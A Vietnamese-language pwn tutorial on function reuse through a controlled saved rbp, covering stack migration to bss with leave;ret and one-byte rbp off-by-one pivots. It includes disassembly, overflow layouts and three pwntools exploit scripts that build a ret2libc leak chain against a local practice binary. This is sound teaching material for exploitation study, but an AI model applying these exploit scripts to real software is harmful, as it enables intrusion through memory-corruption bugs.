Function Reuse via rbp

Khi overflow chỉ cho ghi đè saved rbp + saved RIP (hoặc chỉ 1 byte rbp), nhưng binary có một hàm hữu ích (vd read/gets vào [rbp-X]). Kiểm soát rbp làm hàm ghi/đọc vào nơi ta chọn, và chuỗi leave; ret để quay lại hàm nhiều lần — "migration" dần dựng payload mà không cần nhiều gadget.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Quan sát: nhiều hàm thao tác qua rbp — read(0, rbp-0x40, n), printf(rbp-0x40)... Nếu ta kiểm soát saved rbp, hàm sẽ ghi/đọc vào địa chỉ ta chọn (rbp−0x40).

Migration: ghi đè saved rbp = vùng mới + saved RIP = địa chỉ hàm (bỏ prologue push rbp) → hàm chạy lại với rbp mới → ghi payload vào vùng mới. Lặp để tái dùng hàm dựng dần chuỗi dài.

1-byte rbp: đôi khi chỉ off-by-one ghi được 1 byte của rbp → vẫn pivot/đổi hướng được một đoạn (kết hợp brute).

Nếu chỉ nhớ một điều: kiểm soát rbp = kiểm soát nơi hàm đọc/ghi; leave;ret lặp để tái dùng hàm.

🚦 Dùng khi

Overflow chỉ tới saved rbp + RIP (hẹp) · có hàm thao tác qua rbp (read/gets/printf vào [rbp-X]) · muốn ghi payload vào vùng cố định (bss) hoặc quay lại hàm nhiều lần.

payload = buf_fill + p64(NEW_BASE) + p64(func_after_prologue)
# func_after_prologue = địa chỉ hàm BỎ QUA "push rbp; mov rbp,rsp"
# → hàm chạy với rbp = NEW_BASE → ghi vào NEW_BASE - X
🔁 Lặp bằng leave; ret

Kết thúc mỗi vòng bằng leave; ret (epilogue chuẩn): rsp theo rbp đã đặt → "ret" vào payload ta vừa ghi ở vùng mới → tiếp tục chain.

🧱 Ghi địa chỉ bằng read qua rbp 
# read(0, rbp-0x40, 0x100) với rbp=bss+0x40 → ghi 0x100 byte vào bss
⚠️ Bẫy

Phải nhảy vào hàm sau prologue (nếu không, push rbp làm hỏng rbp ta đặt). rbp off-by-one chỉ đổi 1 byte → cần đích cùng trang/brute. Kết thúc phải leave;ret để rsp theo rbp mới.

01 / NỀN TẢNG BẮT BUỘC

rbp làm "mốc" truy cập biến cục bộ

Compiler dùng rbp làm mốc: biến cục bộ ở [rbp-X], tham số ở [rbp+X]. Một hàm như read(0, buf, n) với buf cục bộ dịch thành lea rdi, [rbp-0x40]; ...; call read. Nếu attacker đặt rbp = giá trị tùy ý, hàm sẽ thao tác tại rbp-0x40 = bất kỳ đâu. Prologue chuẩn push rbp; mov rbp, rsp thiết lập rbp; epilogue leave (mov rsp,rbp; pop rbp); ret khôi phục.

rbp (frame pointer)

Gọi lại hàm có sẵn với rbp mới.

after prologue

02 / VÌ SAO CÓ KỸ THUẬT

Khi overflow siêu hẹp

Có đề chỉ cho ghi đè đúng saved rbp + saved RIP (16 byte), hoặc tệ hơn — off-by-one chỉ 1 byte của rbp. Không đủ cho chuỗi ROP. Nhưng chương trình thường có sẵn một hàm "ghi dữ liệu theo rbp" (read/gets). Bằng cách tái dùng hàm đó với rbp ta kiểm soát, ta ghi payload vào vùng cố định rồi pivot vào đó — dựng dần một khai thác đầy đủ từ một lỗ hổng tí hon. Đây là nghệ thuật "làm nhiều từ ít".

03 / rbp ĐIỀU KHIỂN · MỤC LÕI

Hàm ghi vào rbp−X (số thật)

// hàm vuln (disasm):
push   rbp
mov    rbp, rsp
sub    rsp, 0x40
lea    rdi, [rbp-0x40]     # buf = rbp-0x40
mov    edx, 0x100
call   read                # read(0, rbp-0x40, 0x100)
leave                       # mov rsp,rbp; pop rbp
ret

Nếu ta ghi đè saved rbp của hàm GỌI nó thành bss+0x40, và return vào sau prologue (địa chỉ lea rdi,[rbp-0x40]), thì read ghi 0x100 byte vào bss — vùng ta chọn.

Bố cục overflow (số thật)

bufferb"A"*0x40
0x404140saved rbp = bss(0x404100) + 0x40 → read ghi vào 0x404100
0x40118asaved RIP = vuln+sau_prologue (lea rdi,[rbp-0x40])
Sau prologueNếu return vào ĐẦU hàm (push rbp), rbp ta đặt bị push đè rồi mov rbp,rsp ghi lại — mất kiểm soát. Nên nhảy vào SAU push rbp; mov rbp,rsp (giữ rbp ta đặt).
04 / STACK MIGRATION (lặp)

Dời sang bss & chạy chuỗi dài

2 bước migration

1

Nạp chain vào bss

rbp=bss+0x40, return vào read-sau-prologue → read ghi chain (ret2libc/execve) vào bss. Kết thúc hàm bằng leave;ret.

2

Pivot & chạy

leave: rsp=rbp(bss+0x40); pop rbp; ret → nhảy vào chain tại bss → chạy chuỗi dài.

Sắp xếp bssCần tính kỹ offset: read ghi tại rbp−0x40, nhưng leave đặt rsp=rbp rồi pop (rsp+8). Căn để chain[0] rơi đúng rsp sau leave. Dựng & kiểm bằng gdb từng bước.
05 / TỰ TAY THỬ

rbp điều khiển nơi read ghi

Nhập giá trị rbp → xem read(rbp−0x40) ghi vào đâu, và sau leave;ret thì rsp ở đâu.

07 / EXPLOIT ĐẦY ĐỦ

Migration: read→bss→pivot→ret2libc

// vuln.c — hàm read(0, buf[0x40], 0x100) kết thúc leave;ret; overflow hẹp
# BẢN A — tái dùng read để nạp chain vào bss, leave;ret pivot. Số thật.
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

vuln_after = exe.sym.vuln + 4      # sau push rbp; mov rbp,rsp
leave_ret  = 0x40117c
bss        = exe.bss(0x400)          # 0x404100
pop_rdi    = 0x401263

# chain ret2libc (leak) sẽ nằm ở bss:
chain = flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main)

# GIAI ĐOẠN 1: ghi đè rbp=bss+0x40, RIP=vuln_after → read ghi chain vào bss.
# hàm kết thúc leave;ret → pivot vào bss.
pay  = b"A"*0x40
pay += p64(bss + 0x40)              # saved rbp → read ghi vào bss
pay += p64(vuln_after)                # chạy lại read với rbp mới
p.send(pay)

# read lần này nhận 'chain' → ghi vào bss ; sau đó leave;ret pivot vào bss
p.send(chain.ljust(0x100, b"\x00"))
# → chain chạy: leak puts → rebase → quay main → giai đoạn 2 system
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc.address = leak - libc.sym.puts
# ... giai đoạn 2: ret2libc như bài ret2libc ...
p.interactive()
Thành thậtSố vuln_after=sym.vuln+4, leave_ret, bss & cách leave;ret pivot phụ thuộc disasm đề. Căn offset chain trong bss cho đúng rsp sau leave — dựng & kiểm từng bước bằng gdb. Đây là "migration" kinh điển.
# BẢN B — off-by-one: chỉ ghi được 1 byte thấp của saved rbp.
from pwn import *
exe = ELF("./vuln", checksec=False); p = process(exe.path)
# saved rbp đổi 1 byte → trỏ về trong CÙNG buffer (cùng trang) nơi ta kiểm soát.
# ghi payload giả vào buffer tại offset đó; leave;ret sẽ pivot vào đấy.
pay = b"B"*8 + fake_chain          # fake_chain tại vị trí byte-thấp trỏ tới
pay = pay.ljust(0x40, b"A")
pay += p8(0x00)                        # ghi 1 byte thấp rbp = 0x..00 (căn)
p.send(pay)
# có thể cần brute vì byte thứ 2 ngẫu nhiên (xem partial_overwrite)
p.interactive()
off-by-oneKhi chỉ đổi 1 byte rbp: trỏ nó về trong chính buffer (cùng trang) nơi ta đã đặt một "fake frame". Nếu byte thứ 2 ngẫu nhiên → brute 1/16 (xem partial_overwrite).
# BẢN C — pwntools dựng chain, migration thủ công.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False); p = process(exe.path)
bss = exe.bss(0x400); vuln_after = exe.sym.vuln + 4
r = ROP(exe); r.call(exe.plt.puts, [exe.got.puts]); r.call(exe.sym.main)
p.send(b"A"*0x40 + p64(bss+0x40) + p64(vuln_after))
p.send(r.chain().ljust(0x100, b"\x00"))
# ... leak, rebase, giai đoạn 2 ...
p.interactive()

09 / GỠ LỖI

Khi migration không chạy

rbp bị đè

Return đầu hàm → prologue phá rbp. Vào sau prologue.

read ghi sai chỗ

rbp−X ≠ đích. Kiểm offset X trong disasm.

Chain lệch

leave đặt rsp=rbp rồi pop. Căn chain trong bss.

bss không ghi được

Dùng .data hoặc vùng khác ghi được.

off-by-one không đủ

1 byte không tới đích. Cần đích cùng trang + brute.

PIE

Địa chỉ random. Leak trước; migration phức tạp hơn.
